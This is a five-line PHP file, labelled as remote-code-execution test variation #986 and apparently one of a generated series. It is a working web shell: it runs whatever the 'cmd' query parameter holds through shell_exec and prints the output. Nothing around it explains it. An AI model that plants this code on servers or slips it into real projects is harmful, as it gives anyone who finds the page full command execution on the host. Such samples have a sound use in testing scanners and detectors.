<?php
// RCE test variation #986
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>